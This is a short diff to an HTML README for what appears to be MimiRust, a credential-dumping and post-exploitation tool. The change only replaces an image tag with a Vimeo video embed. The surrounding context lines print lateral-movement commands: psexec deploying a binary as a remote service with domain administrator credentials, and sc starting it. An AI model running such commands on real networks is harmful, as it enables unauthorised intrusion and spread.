@@ -101,7 +101,8 @@
 <br><h3>Lateral movement through the network</h3>
 <code>psexec /computer:WIN-SJ39U8K8RBS /binary_path:\\WIN-GVVSP2K4NM6\C$\Users\Administrator\Downloads\write.exe /sn:MimiRust /user:THOTTYSPLOITY\Administrator /pass:Welcome01</code><br>
 <code>shell sc \\WIN-SJ39U8K8RBS start MimiRust</code><br>
-<img src="https://vimeo.com/707086452" alt="Lateral movement" width="100%">
+<iframe src="https://player.vimeo.com/video/707086452?h=d8b8b297d6&autoplay=1" width="640" height="360" frameborder="0" allow="autoplay; fullscreen; picture-in-picture" allowfullscreen></iframe>
+<p><a href="https://vimeo.com/707086452">psexec.mp4</a> from <a href="https://vimeo.com/user174338549">Rawr</a> on <a href="https://vimeo.com">Vimeo</a>.</p>
 
 <h2>Demo</h2>
 <small>click on the demo to get a higher resolution</small>
